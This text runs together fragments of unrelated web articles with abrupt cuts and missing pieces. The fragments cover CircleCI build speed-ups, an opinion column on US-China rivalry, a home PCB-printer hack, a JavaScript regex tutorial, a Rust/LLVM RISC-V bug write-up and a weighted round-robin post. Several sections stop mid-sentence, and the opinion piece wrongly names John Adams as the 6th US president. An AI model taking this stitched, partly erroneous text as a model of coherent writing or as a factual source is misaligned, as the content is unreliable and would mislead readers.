tools like <code>bash</code> or <code>jq</code> by default).</p><h3 id="2-use-shallow-clones-for-swift-code-checkout">2. Use shallow clones for swift code checkout</h3><p>Repositories balloon over time, especially if you use a monorepo as we do. Even if the file size at HEAD is kept relatively small, <a target="_blank" rel="noopener noreferrer" href="https://stackoverflow.com/questions/5613345/how-to-shrink-the-git-folder">past file blobs can stick around in the .git folder</a>. One of the best ways to speed up <code>git clone</code> commands is to use a <a target="_blank" rel="noopener noreferrer" href="https://www.perforce.com/blog/vcs/git-beyond-basics-using-shallow-clones">shallow checkout</a>.</p><p>There are a few open-source <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/orb-intro/">CircleCI Orbs</a> that make this optimization easy to implement. In particular, <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/orbs/registry/orb/guitarrapc/git-shallow-clone">we like this one</a> because it lets us customize any git settings we’d like.</p><p>To use this orb, at the top of your config, add:</p><div><pre><p><span>1</span><span>orbs</span><span>:</span><span></span></p><p><span>2</span><span>  </span><span>git-shallow-clone</span><span>:</span><span> guitarrapc/git</span><span>-</span><span>shallow</span><span>-</span><span>clone@2.0.3</span></p></pre></div><p>Then replace <code>- checkout</code> in all your jobs with <code>- git-shallow-clone/checkout</code>.</p><p>When we made this change, our checkout step dropped from 15-25 seconds down to 3-5 seconds just like that!</p><p>It’s worth noting that there are two reasons why someone might <em>not</em> use shallow checkouts:</p><ol><li><p><strong>Some Git commands are not supported by shallow checkouts.</strong>
These include fetching information from multiple branches or from deep in the Git history.</p></li><li><p><strong>Git providers sometimes rate limit shallow checkouts.</strong>
This only becomes an issue for large workflows or frequent runs.</p></li></ol><p>That said, for the majority of use cases, shallow checkouts are safe to use and can save a significant amount of time.</p><h3 id="3-untar-in-ram-for-rapid-cache-restores">3. Untar in RAM for rapid cache restores</h3><p>Caching <em>can</em> be a wonderful, run-time-saving thing. That said, accessing our large <code>node_modules</code> folder (nearly 300MB) from the CircleCI cache could sometimes take longer than starting from scratch with a fresh <code>yarn install</code>.</p><p>Internally, CircleCI manages caches and workspaces by putting files into a tarball and uploading that compressed tar file into Amazon S3. When you request a cache, CircleCI downloads the tar file from S3, validates that the file is the one that was requested, and then untars it.</p><p>Because <code>node_modules</code> can have thousands of files, even with lightning-fast network speeds, disk IO can slow down the untar process significantly.</p><p>In our example, restoring our cache took 1:07. Only 6 of those seconds were spent downloading and validating, while decompressing the files took over a minute. In the worst-case scenario, this cache restore step could take up to 3 minutes to complete.</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/6Jtu3bfEugHoXeUokHzzag/d747dd8b395c2fa20910eb5fb2c69538/1i1ZdxE38xmjY57AFoLK9hvEqWZ_fshqhPd6_gCI.png" alt="CircleCI: Untar in RAM."></p></div><p>Lucky for all of us, as of the <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/changelog#ram-disks">April 7th, 2020 CircleCI release</a>, CircleCI supports <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/executor-types/#ram-disks">mounted RAM disks</a> on Docker executors.</p><p>Using these RAM disks has dropped the <code>restore_cache</code> run time down to a consistent 10–20 seconds.

While the larger <code>resource_class</code> costs more money, because our jobs now finish in about half the time, the cost difference has been negligible.</p><p>And while your mileage may vary, give larger instance sizes a try and see if they work for your use case.</p><h3 id="4-parallelize-jobs-for-expedited-workflows">4. Parallelize jobs for expedited workflows</h3><p>Improved caching and access to caches is all very well and good, but when dependencies change, caches need to be updated. In these cases, the <code>yarn install</code> step will need to do more work, as well as the <code>Saving Cache</code> step, adding an extra minute or so to our pipelines. To solve this problem, we decided to play around with parallelization.</p><p>First, we tried saving the cache in a single job separate from all of our other jobs. Each subsequent job could then restore the cache from its saved location in the workspace instead of saving the cache as part of all of our jobs, including the jest tests:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/Uraphwbv2Qr5ch8w5Dc3g/cc782477babf02e39560d899b75a97c7/Before.svg" alt="CircleCI: before restore cache."></p></div><p>Became</p><div>

It could take almost 2 minutes to store our dependencies in the workspace, and that step needed to complete before we started our jest job.</p><p>To get around this problem, we changed the way we split our jobs. We divided them into first-level jobs that can rely on the global cache for dependencies (and don’t depend on the completion of other jobs) and everything else. Then we added a new first-level job, <code>cache-deps</code>, that cached all dependencies for any job that ran after the first level.</p><p>Our new pipeline runs all first-level jobs immediately, and then anything with a dependency. This division has the added benefit that most of our first-level jobs no longer need to write out to the cache, as <code>cache-deps</code> now takes care of that.</p><p>In our config, this looks like:</p><div><pre><p><span>1</span><span>jobs:</span></p><p><span>2</span><span></span><span>+  cache-deps:</span><span></span></p><p><span>3</span><span></span><span>+    parameters:</span><span></span></p><p><span>4</span><span></span><span>+      key:</span><span></span></p><p><span>5</span><span></span><span>+        type: string</span><span></span></p><p><span>6</span><span></span><span>+    executor: ci-node</span><span></span></p><p><span>7</span><span></span><span>+    steps:</span><span></span></p><p><span>8</span><span></span><span>+      - git-shallow-clone/checkout</span><span></span></p><p><span>9</span><span></span><span>+      - restore_cache:</span><span></span></p><p><span>10</span><span></span><span>+          keys:</span><span></span></p><p><span>11</span><span></span><span>+            - &lt;&lt; parameters.key &gt;&gt;</span><span></span></p><p><span>12</span><span></span><span>+      - run: yarn install</span><span></span></p><p><span>13</span><span></span><span>+      - save_cache:</span><span></span></p><p><span>14</span><span></span><span>+          paths:</span><span></span></p><p><span>15</span><span></span><span>+            - node_modules</span><span></span></p><p><span>16</span><span></span><span>+            - packages/admin-dashboard/node_modules</span><span></span></p><p><span>17</span><span></span><span>+            - packages/core/node_modules</span><span></span></p><p><span>18</span><span></span><span>+            - ...</span><span></span></p><p><span>19</span><span></span><span>+      …</span></p></pre></div></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>A while ago, Alex Lo from the South China Morning Post kindly quoted me in one of his columns, and I am happy to return the favour. In his&nbsp;<a href="https://www.scmp.com/comment/opinion/article/3090798/must-united-states-demonise-china">piece</a>&nbsp;last week, Lo raised an interesting aspect. America has always needed an enemy, or so he put it, and China was but the latest in a long series of “monsters” in need of destruction. His introductory quote of John Adams, the 6th US president, warning against such behaviour had long been dismissed and become a blueprint for America’s engagement in the world.</p>

<p>Lo goes on saying that every post-War president, including Donald Trump, went into office trying to heed Adams’ wise advice but ended up doing the opposite. We can see the temptation. When your military is deployed in more than 150 countries in a world that has fewer than 200, one may claim not to run an empire, and America has obviously not done that in the textbook sense of it, but according to Lo it obviously becomes harder to justify your presence regardless what fanciful claims you make.</p>

<p>When you have a democracy, public opinion must be managed or, in some cases, even manufactured. And these days, America seems to be in the business of demonising China to do just that and deflect from domestic issues. Lo thinks that simply existing as a rising power, such as China, is enough to make someone an enemy, which must be isolated, demonised, contained, if not destroyed. How Washington has tried to use Hong Kong as a pressure point and factor in this hegemonic calculus is remarkable.</p>

<p>But here it comes what Lo is saying that absolutely resonates… Creating an enemy requires the opposing entity to behave like one or declare itself as one. The issue with this is, does China want to be America’s enemy? From the evidence of China’s actions and reactions, one wouldn’t get the impression. Despite the poking and provoking of Trump’s vassals as well as the entire Washington establishment itself Beijing hasn’t exactly taken the bait and manoeuvred skillfully across the minefield.</p>

<p>Isolating China as Mike Pompeo trumpets to be America’s foremost policy is easier said than done on a globe of many stakeholders. It would inevitably mean some sort of a Cold War, but China can’t be compared to the Soviet Union in any respect. Who would assemble to constitute one bloc versus the other? Washington by way of modern-day mantras such as America First doesn’t seem to be able to recruit an incremental number of countries to form a bloc.</p>

<p>To be sure, there are a few allies that would go out of their way to walk in step with America. A die-hard one these days appears to be Australia that under their current government seems to have sold their soul to America’s cause of having an enemy, or otherwise called the Indo-Pacific initiative. There may be others, but they haven’t come forward as carrying Washington’s water. Apart from possibly the UK, forget about Europe. India more and more seems inclined to play ball, but don’t bet on it.</p>

<p>On the flip side, China isn’t even interested in forming a bloc, and it may not need to in the first place. As long as Beijing’s trading partners behave in the context of an open and multilateral word order, why have a bloc? Readers may think I forgot Japan and South Korea as US allies in Indo-Pacific. I wouldn’t be too sure about that. Tokyo and Seoul have been careful not to provoke Beijing, much as the ASEAN countries will not be lured into taking sides. Trade and regional integration are top on their minds.</p>

<p>Europe is developing a similar mindset gradually and under the duress of Trump’s bullying. Never mind what formal condemnations echo from Brussels with regards to China’s presence and actions. The reality is that China’s economy has been least impacted by the health crisis, and who wouldn’t want to partner with the top dog in global business, for maybe years to come. Pragmatism against the backdrop of a sole superpower in relative decline seems to be the motto going forward.</p>

<p>While Trump and Joe Biden are busy greasing their propaganda machines and attempt to outperform each other bashing China, as they have little else to show for but the declared enemy, vast parts of the rest of the world are moving on. It’d be too nonchalant to claim that all is business as usual for the Chinese, but apart from building its own mouthpieces on social media the Beijing leadership has distinctly avoided direct confrontation with mostly Pompeo’s attack tirades.</p>

<p>Instead, the moves from Beijing have been a lot more subtle, such as leaving no doubt about the territorial integrity of China, rushing its contingency plans in response to US tech bans, building on its alliance with Russia, schmoozing European countries into commercial partnerships, veering trade away from America to ASEAN, cultivating a more constructive relationship with Japan and Korea, and stubbornly pursuing the generational Belt and Road and the commensurate expansion of its ecosystem.</p>

<p>If you think about it, no sane person would call any of these actions outright anti-American, apart from the American government itself of course. Anything and everything Beijing does, as a matter of the country’s existential needs or as a reaction to any bullying, is deemed a provocation on Washington’s end. It’s not even a question of chicken and egg. This is what propaganda is and does. It creates a narrative that the masses and stakeholders are being spoon-fed, no matter how much truth there is.</p>

<p>China doesn’t want conflict. Why would it? Neither is it in any danger of trying to become an imperial power and take over the world as some mainstream media have insinuated. All China wants is to further its country and people, a legitimate quest. Naturally, its growth changes the global equation, and that is being perceived as a threat. But is China an enemy by definition? Well, in the world of one sole superpower it has the potential of becoming one. In a multilateral and -polar world of the future, however, it doesn’t need to be.</p>

<p>In many locations you can get PCBs made fast, cheap, and of very good quality. In Brazil, where Vítor Barbosa lives, this isn’t the case, so he built a&nbsp;“<a href="https://hackaday.io/project/171775-haxmark460-home-pcb-printer">haxmark460</a>” PCB printer&nbsp;to help manufacture circuits at home.</p>
<p> The build modifies a Lexmark E460dn laserjet printer to mark PCBs directly, using an aluminum carrier plate instead of its normal paper feed operation.</p>
<p>An Arduino is utilized to hijack and output printer signals, enabling it to it to work in a much different way than how it was originally designed. The carrier plate, with blank PCB material taped on, is fed into the front and the PCB is pulled through and properly marked by the printer. After a dip in acetone to allow the toner to stick to the copper, the board is ready to etch!</p>

        </figure>
        <p>The first time I encounter a regular expression was many years ago, but I still remember my first thoughts on it:</p>
<ol>
<li>What is this string-like thing?</li>
<li>I rather don’t touch it, looks scary</li>
</ol>
<p>I don’t remember quite well what that regex was doing, or how exactly looked like, but it scared me to death. Looking in retrospective I realize that it was probably not scary at all and that in fact, it was an easy way to solve the problem in hand. But why did I got this feeling? It’s just the awkwardness of the syntax, they certainly look strange, and if you don’t know what they are, they look very complicated.</p>
<p>My intention here is not to scare you out, regex can be simple once we understand them, but if you don’t and you look at something like this:</p>
<div><pre><code data-lang="text">^\(*\d{3}\)*( |-)*\d{3}( |-)*\d{4}$
</code></pre></div><p>Can be intimidating…</p>
<p>Today we are going to demystify regular expressions, we will see what they are, what they are useful for, and how you can design your regular expressions to solve problems.</p>
<hr>
<h2 id="what-are-regular-expressions">What are regular expressions</h2>
<p>Regular expressions are a way to describe patterns in data strings. They have their own syntax, as is they are their own programming language, and there are methods and ways to interact with regular expressions in most (if not all) programming languages.</p>
<p>But what kind of patterns are we talking about? common examples of regular expressions determine for example if a given string is an email address or a phone number, or they can be used to verify if a password fulfills a certain complexity.</p>
<p>Once you have the pattern, what can you do with the regular expressions?</p>
<ul>
<li>validate a string with the pattern</li>
<li>search within a string</li>
<li>replace substrings in a string</li>
<li>extract information from a string</li>
</ul>
<hr>
<h2 id="working-with-regular-expressions">Working with regular expressions</h2>
<p>For this article, we are going to cover how to work with regular expressions in JavaScript, though the concepts learned here apply to other languages as well. With that said, in other languages, there may be some differences in the way they treat regular expressions.</p>
<p>Let’s look at an example that will validate if the string contains the word <code>Hello</code> or not.</p>
<p>In JavaScript there are 2 ways to going about this:</p>
<ul>
<li>Constructor</li>
<li>Literal</li>
</ul>
<h3 id="constructor">Constructor</h3>
<div><pre><code data-lang="javascript"><span>const</span> <span>regex</span> <span>=</span> <span>new</span> RegExp(<span>'Hello'</span>)
<span>const</span> <span>result</span> <span>=</span> <span>regex</span>.<span>test</span>(<span>'Hello World!'</span>)
<span>console</span>.<span>log</span>(<span>result</span>)

<span>--------------</span>
<span>Output</span>
<span>--------------</span>
<span>true</span>
</code></pre></div><h3 id="literal">Literal</h3>
<div><pre><code data-lang="javascript"><span>const</span> <span>regex</span> <span>=</span> <span>/Hello/</span>
<span>const</span> <span>result</span> <span>=</span> <span>regex</span>.<span>test</span>(<span>'Hello World!'</span>)
<span>console</span>.<span>log</span>(<span>result</span>)

<span>--------------</span>
<span>Output</span>
<span>--------------</span>
<span>true</span>
</code></pre></div><p>In both scenarios, the variable <code>regex</code> is an object, which exposes different methods we can use to interact with the regular expression. However, the first example has a more familiar look, instancing an object with a <code>string</code> as a parameter. In the second scenario things look a bit weird, there is something that resembles a <code>string</code> but instead of quotes is wrapped in <code>/</code>. As it turns out both ways represent the same, I personally like the second option, which is very clean, and IDEs or code editors can have syntax highlighting on the regular expression compared to the first scenario where the regular expression pattern is defined just as a string.</p>
<p>So far our regular expressions have been fairly simple, is just the exact match on the string <code>Hello</code> and it worked perfectly for JavaScript, however the result we obtained can be different for other languages, even though the regular expression is the same. This is because each programming language can define certain defaults or special behaviors in their regular expressions which can vary from one to another. So sorry about that, but is just how it is. When we build a RegEx, though for the most part will be the same in most programming languages, before you use it somewhere else you will have to test it and adjust it if necessary.</p>
<hr>
<h2 id="different-uses-of-regular-expressions">Different uses of regular expressions</h2>
<p>When working with regular expressions we are basically working with the RegExp object methods, or with string methods which allows us to interact with regular expressions.</p>
<h3 id="regexpprototypetest">RegExp.prototype.test()</h3>
<p>The <code>test()</code> method executes a search for a match between a regular expression and a specified string. Returns <code>true</code> or <code>false</code>.</p>
<p>Example: Look if the specified string contains the string <code>foo</code></p>
<div><pre><code data-lang="javascript"><span>const</span> <span>str</span> <span>=</span> <span>'table football'</span>

<span>const</span> <span>regex</span> <span>=</span> RegExp(<span>'foo'</span>)
<span>console</span>.<span>log</span>(<span>regex</span>.<span>test</span>(<span>str</span>))

<span>-------------</span>
<span>Output</span>
<span>-------------</span>
<span>true</span>
</code></pre></div><h3 id="regexpprototypeexec">RegExp.prototype.exec()</h3>
<p>The <code>exec()</code> method executes a search for a match in a specified string. Returns a result array, or null.</p>
<p>Example: Look for all the instances of <code>foo</code> in the given string</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>str</span> <span>=</span> <span>'table football, foosball'</span>
<span>const</span> <span>regex</span> <span>=</span> <span>/foo/g</span>

          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>

<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

				<p><strong>UPDATE 6/25/2020:</strong> The bottom of the post now has a section about using 2D low discrepancy sequences with an alias table and compares results vs the 1D methods.  The code has been updated as well to include that stuff.</p>
<p>In this post we are going to talk about Round Robin first, then Weighted Round Robin.</p>
<p>The ~500 lines of standalone C++ that generated the data for this blog post can be found at <a href="https://github.com/Atrix256/WeightedRR" rel="nofollow">https://github.com/Atrix256/WeightedRR</a></p>

<p>Let’s say you find yourself in one of these 2 equivalent scenarios:</p>
<ol>
<li>You want to repeatedly choose from a list of 10 objects in a fair way, where the objects are chosen at roughly the same rate – like, a loot drop table for killing monsters in a game.</li>
<li>You have 10 queues of work that you want to process work items from in a fair way, where work is consumed from the queues at roughly the same rate.</li>
</ol>
<p>In either case you want a stream of integers between 0 and 9 where ideally any section – large or small – should have roughly even counts of those numbers chosen.  In other words, it should have a flat histogram for both large and small sections.</p>
<p>One way to deal with this is to just walk through the numbers 0 through 9 over and over and over.  You could increment a number whenever you wanted the next index and use modulus to ensure it was between 0 and 9.</p>
<p>I’m calling this “Sequential” in the graphs and that would work, but depending on your usage case, it might be undesirable that it was so obviously going in order from 0 to 9.</p>
<p>Another way to deal with this would be to roll a random integer 0 through 9 and use that as your answer.  In the code, I roll a random float between 0 and 1 and remap that to an integer 0 through 9 so it’s more like the other methods.  I’m calling this “White Noise” in the graphs and that also would work in that the histogram is going to be flat after an infinite number of samples, but it won’t be very flat in small numbers of samples.</p>
<p>Yet another way to deal with this is to use a low discrepancy sequence (deterministic or randomized aka blue noise) such as the golden ratio additive recurrence low discrepancy sequence which looks like this:</p>
<pre title="">float GetNextValue(float x)
{
  float newX = x + 1.61803398875f;
  return newX - floor(newX);
}
</pre>
<p>In the above, the first value you ever plug into this function can be any number.  It can be 0.0, but it doesn’t have to be.</p>
<p>1.61803398875 is the golden ratio and since we are dealing with values between 0 and 1, you could also use 0.61803398875 instead which is the fractional part of the golden ratio, but is also 1 divided by the golden ratio (the golden ratio conjugate).</p>
<p>The golden ratio is a good choice here because it’s an irrational number, meaning that from a mathematical point of view (ignoring limitations of computers for a second) it won’t ever repeat values.</p>
<p>The golden ratio is also an excellent choice among irrational numbers because it is the most irrational number.  Less irrational numbers – like pi – still don’t repeat but they have “near repeats” which make them less good of a choice.  Then there are numbers like the square root of 2, which are pretty decently irrational – more than pi, but less than the golden ratio.</p>
<p>An alternate way to write the code is like this, which gives you “random access” to the sequence, but is more prone to having floating point precision issues.</p>
<pre title="">float GetValue(int index, float seed)
{
  float newX = seed + float(index) * 1.61803398875f;
  return newX - floor(newX);
}
</pre>
<p>If you use this in our problem for generating floating point values between 0 and 1 and remapping to integers 0 through 9, you will get fairly even counts of occurrences of those integers (a fairly flat histogram) from both small and large sections of the sequence.</p>
<p>Here is a screenshot of the program generating a sequence of 80 items, using the techniques talked about so far.</p>
<p><a href="https://demofox2.files.wordpress.com/2020/06/unweighted50.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted50.png?w=800"></a></p>
<p>It’s hard to tell what the histogram looks like from that, but it is still a bit interesting looking at the difference in patterns of the numbers chosen.  There are seeming patterns even in the golden ratio because the values are quantized to 10 possible values.</p>
<p>Here are histograms of 100 samples. It shows that white noise is doing noticeably worse than the irrational numbers, but the irrational numbers don’t have a winner that is easy to discern with the naked eye.  Sequential can’t even be seen because it is by definition a completely flat histogram and so is a flat line at y=0.1.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted100.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted100.png?w=800"></a></p>
<p>Here are histograms of 10,000 samples. White noise and pi look about the same, but golden ratio and square root of 2 are much closer to the actual flat histogram value / sequential sequence.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted10k.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted10k.png?w=800"></a></p>
<p>Here are histograms of 1,000,000 samples. White noise is way worse than everything else, but it’s hard to see a winner from the rest of the group.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted1m.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted1m.png?w=800"></a></p>
<p>Here we remove white noise from the graph to see the others better. Pi shows being the worst. Square root of two is next, and then the golden ratio which is closest to the sequential / flat histogram line.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/unweighted1mb.png"><img src="https://demofox2.files.wordpress.com/2020/06/unweighted1mb.png?w=800"></a></p>
<h2>Round Robin vs Random Integers</h2>
<p>When using white noise, round robin is just random integers.  It’s the same as rolling dice.  So what is the difference?</p>
<p>In the last section I say that using a low discrepancy sequence is better than using white noise, because it reaches the target histogram more accurately with fewer samples – fewer rolls of the dice.</p>
<p>The downside to this though is that the numbers are no longer random… a person viewing the sequence of numbers can almost certainly guess what the next number is going to be.</p>
<p>So, that makes it not useful to use these for places where randomization is important – like when gambling or for cryptography.</p>
<p>But, where this is useful is for places where fairness matters but randomness does not.</p>
<p>One example could be pulling work items from a work queue.  Who cares if it is possible to guess which thread is going to get assigned the next item of work?  The important thing is that the work is spread evenly.</p>
<p>Another example is in numerical integration in monte carlo integration, and also other stochastic rendering situations.  This is more what I care about.  In these situations, you don’t care if the choice can be predicted or not, but if you can reduce the amount of error vs the target distribution in fewer samples that means you’ll have less noise in your resulting image, which is ::chef kiss:: oh so great.  A better image for the same processing power.</p>
<p>If you were in a situation that wanted randomness, but you still wanted some of these benefits, you should check out “blue noise”, which is a randomized version of low discrepancy sequences.  A good place to start might be my post on generating blue noise in 2 dimensions, which you could modify to only generate 1 dimensional blue noise and use for this purpose.</p>
<p><a href="https://blog.demofox.org/2017/10/20/generating-blue-noise-sample-points-with-mitchells-best-candidate-algorithm/" rel="nofollow">https://blog.demofox.org/2017/10/20/generating-blue-noise-sample-points-with-mitchells-best-candidate-algorithm/</a></p>
<h2>Weighted Round Robin</h2>
<p>Let’s say you find yourself in the same situation as before but now there are weighted probabilities involved.</p>
<ul>
<li>For the loot drop situation, different loot should be awarded with different probabilities.</li>
<li>For the work queues, you could have different powered CPUs servicing the work queues maybe.  More powerful processors should be more likely to get work served to them perhaps.</li>
</ul>
<p>For our situation, we’ll say that the weight of item 0 is 1, the weight of item 1 is 2, and so on, up to the weight of item 9 being 10.</p>
<p>Let’s check out our options again.</p>
<p>First, we could go sequentially.  This means that our sequence would go like this: 011222333344444… etc.</p>
